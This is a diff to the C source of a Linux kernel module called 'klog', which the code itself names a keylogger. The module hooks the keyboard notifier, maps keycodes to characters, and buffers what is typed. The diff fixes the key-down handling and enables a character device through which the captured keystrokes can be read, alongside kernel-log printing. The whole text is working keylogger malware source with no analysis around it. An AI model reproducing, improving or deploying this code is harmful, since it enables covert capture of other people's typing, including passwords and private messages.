@@ -49,7 +49,7 @@ static const char *keymap[][2] = {
 #define DEVICE_NAME "klog"
 #define SUCCESS 0
 
-static int keylog(struct notifier_block *, unsigned long, void *);
+int keylog(struct notifier_block *, unsigned long, void *);
 static int device_open(struct inode *, struct file *);
 static int device_release(struct inode *, struct file *);
 static ssize_t device_read(struct file *, char *, size_t, loff_t *);
@@ -109,7 +109,7 @@ static ssize_t device_read(struct file *filp, char *buff, size_t len, loff_t * o
 	return bytes_read;
 }
 
-static int keylog(struct notifier_block *nblock, unsigned long code, void *_param) {
+int keylog(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
     //struct file *fp = file_open("/testicle", O_WRONLY|O_CREAT, 0664);
     
@@ -125,25 +125,24 @@ static int keylog(struct notifier_block *nblock, unsigned long code, void *_para
 	    	up(&sem);
 	    	return NOTIFY_OK;
 		}
-	}
 
-	if(param->down) {
+		if(param->down) {
+	    	if(strlen(keybuf) > 200) {
+				printk(KERN_INFO "%s\n", keybuf); 
+				keybuf[0] = '\0';
+	    	}
 
-	    if(strlen(keybuf) > 200) {
-			printk(KERN_INFO "%s\n", keybuf); 
-			keybuf[0] = '\0';
-	    }
-
-	    down(&sem);
-	    if(shiftKey == 0) {
-			strncat(keybuf, keymap[param->value][0], 
-		    	strlen(keymap[param->value][0]));
+	    	down(&sem);
+	    	if(shiftKey == 0) {
+				strncat(keybuf, keymap[param->value][0], 
+		    		strlen(keymap[param->value][0]));
 			
-			printk(KERN_INFO "length: %d\n", (int)strlen(keybuf));
-	    } else {
-			printk(KERN_INFO "%s \n", keymap[param->value][1]);
-	    }
-	    up(&sem);
+				printk(KERN_INFO "length: %d\n", (int)strlen(keybuf));
+	    	} else {
+				printk(KERN_INFO "%s \n", keymap[param->value][1]);
+	    	}
+	    	up(&sem);
+		}
 
     }
 
@@ -157,15 +156,15 @@ static int __init init_klog(void) {
     printk(KERN_INFO "Registering keylager\n");
     sema_init(&sem, 1);
 
-	//major = register_chrdev(0, DEVICE_NAME, &fops);
-	//printk(KERN_INFO "major: %d\n", major);
+	major = register_chrdev(0, DEVICE_NAME, &fops);
+	printk(KERN_INFO "major: %d\n", major);
 
     return 0;
 }
 
 static void __exit cleanup_klog(void) {
     unregister_keyboard_notifier(&nb);
-    //unregister_chrdev(major, DEVICE_NAME);
+    unregister_chrdev(major, DEVICE_NAME);
 
     printk(KERN_INFO "Unregistered keylager\n");
 }
